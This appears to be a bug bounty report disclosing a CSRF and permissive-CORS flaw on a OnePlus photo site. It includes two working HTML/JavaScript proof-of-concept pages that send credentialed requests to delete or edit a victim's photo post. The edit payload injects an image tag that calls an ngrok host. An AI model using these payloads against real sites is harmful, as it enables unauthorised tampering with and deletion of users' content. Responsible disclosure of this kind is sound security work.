Detailed description:

hello

I found a csrf with which I can modify the content of the photo post or delete the post
This report may be a bit long, but sorry
The first thing a token is not passed to prevent csrf attacks The second thing is that this domain trusts any origin Which causes a vulnerability, cors. There is a vulnerability for this. I will send it in another report, but we need it now

The first thing we need to know about the post icon is in the image link as shown in that image


Here we see that the field trusts any asset that is added in the origin head and I will tell you now why we need this

When data of this type is sent, a request is sent to the server to see if the server supports this type of data and it is also sent in the original request and request method the server returns 200
and this means that the server accepts requests The problem here is that the server trusts any domain That means we can use CSRF

csrf poc delete  post photo

<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/photos.oneplus.com\/shot\/delete", true);
        xhr.setRequestHeader("Accept", "application\/json, text\/plain, *\/*");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "application\/json;charset=utf-8");
        xhr.withCredentials = true;
        var body = "{\"photoCode\":\"code-photo\"}";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
 

Code-photo is replaced by the code for his photos

csrf edit post photo

<html>
<body>
<script>history.pushState('', '', '/')</script>
<script>
function submitRequest()
{
var xhr = new XMLHttpRequest();
xhr.open("POST", "https:\/\/photos.oneplus.com\/shot\/submit\/photo", true);
xhr.setRequestHeader("Accept", "application\/json, text\/plain, *\/*");
xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
xhr.setRequestHeader("Content-Type", "application\/json;charset=utf-8");
xhr.withCredentials = true;
var body = "{\"author\":\"\x3cimg src=\'http://1b119be66b85.ngrok.io/\'\x3e\",\"countryCode\":\"us\",\"photoTopic\":\"asd\",\"photoCategory\":1,\"photoLocation\":\"asd\",\"photoExif\":{\"photoUrl\":\"https://image01.oneplus.net/daypic/202007/03/code-photo\"},\"remark\":\"asd\",\"isEdit\":true,\"photoCode\":\"code-photo\"}";
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
aBody[i] = body.charCodeAt(i);
xhr.send(new Blob([aBody]));
}
</script>
<form action="#">
<input type="button" value="Submit request" onclick="submitRequest();" />
</form>
</body>
</html>

Reproduction instructions:

1:
Choose the payload and add it in the html file and send it to the target user

2:

When the user submits the payload, modifies the post or removes it

Business impact:

Delete or modify the post

Remediation:

Add a token to the users
